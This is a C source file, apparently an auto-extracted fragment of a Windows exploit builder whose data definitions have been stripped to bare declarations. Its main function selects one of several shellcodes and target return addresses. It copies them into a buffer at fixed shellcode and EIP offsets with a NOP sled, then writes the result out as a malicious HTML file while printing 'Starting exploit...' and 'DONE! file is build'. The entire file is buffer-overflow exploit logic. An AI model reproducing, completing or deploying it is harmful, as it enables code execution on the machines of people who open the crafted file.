#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct TYPE_4__ {char* shellname; int /*<<< orphan*/ * shelltype; } ;
struct TYPE_3__ {char* windows; int /*<<< orphan*/  eip; } ;

/* Variables and functions */
 int EIP_OFFSET ; 
 int /*<<< orphan*/  HTMLFILE ; 
 int SHELL_OFFSET ; 
 size_t T ; 
 void* atoi (char*) ; 
 int /*<<< orphan*/  banner ; 
 char* buffer ; 
 int /*<<< orphan*/  cpy (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/ * data ; 
 int /*<<< orphan*/  exit (int /*<<< orphan*/ ) ; 
 int fbuffer ; 
 int /*<<< orphan*/  fileBuild (int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  getchar () ; 
 int j ; 
 int /*<<< orphan*/  memcpy (int,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  memset (int,int,int) ; 
 int /*<<< orphan*/  print (char*) ; 
 int /*<<< orphan*/  printShell () ; 
 int /*<<< orphan*/  printTargets () ; 
 int /*<<< orphan*/  printf (char*,char*) ; 
 int /*<<< orphan*/  reverseInt (int /*<<< orphan*/ ) ; 
 TYPE_2__* shellc ; 
 int strlen (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  system (char*) ; 
 TYPE_1__* target ; 

int main(int argc,char* argv[])
   {
       system("CLS");
       
       cpy(banner,buffer);
       printf("%s",buffer);
       
       print("Starting exploit...");
       
       printShell();
       printTargets();
       
       if (argc < 2) 
       {
         print("Too few args");
         exit(0);
       }
         memcpy(fbuffer, data, strlen(data)); 
         j=atoi(argv[1]);
         
         switch(j)
         {
           case 0:
              memcpy(fbuffer+SHELL_OFFSET,shellc[0].shelltype,sizeof(shellc[0].shelltype));
              break;
           case 1:
              memcpy(fbuffer+SHELL_OFFSET,shellc[1].shelltype,sizeof(shellc[1].shelltype));
              break;             
           case 2:
              memcpy(fbuffer+SHELL_OFFSET,shellc[2].shelltype,sizeof(shellc[2].shelltype));
              break;      
           case 3:
              memcpy(fbuffer+SHELL_OFFSET,shellc[3].shelltype,sizeof(shellc[3].shelltype));
              memset(fbuffer+SHELL_OFFSET+strlen(shellc[3].shelltype),0x90,161);
              break;      
           default: exit(0);
        } 
        
        T=atoi(argv[2]);    
        
        if (T==0)
        {
          reverseInt(target[T].eip);
          memcpy(fbuffer+EIP_OFFSET,&target[T].eip,4);}
              else
        if (T==1)
        {
          reverseInt(target[T].eip);
          memcpy(fbuffer+EIP_OFFSET,&target[T].eip,4); 
        }
              else 
        if (T==2)
        {
          reverseInt(target[T].eip);
          memcpy(fbuffer+EIP_OFFSET,&target[T].eip,4);
        }
              else
        if (T==3)
        {
          reverseInt(target[T].eip);
          memcpy(fbuffer+EIP_OFFSET,&target[T].eip,4);
        }
             else 
        if (T==4)
        {
          reverseInt(target[T].eip);
          memcpy(fbuffer+EIP_OFFSET,&target[T].eip,4);
        }
        
        fileBuild(HTMLFILE,fbuffer);
        printf("You are using the %s ret address\n",target[T].windows);
        printf("You are using the %s shellcode\n",shellc[j].shellname);
        print("Building file");
        print("DONE! file is build");
        
        getchar();
        return 0;
   }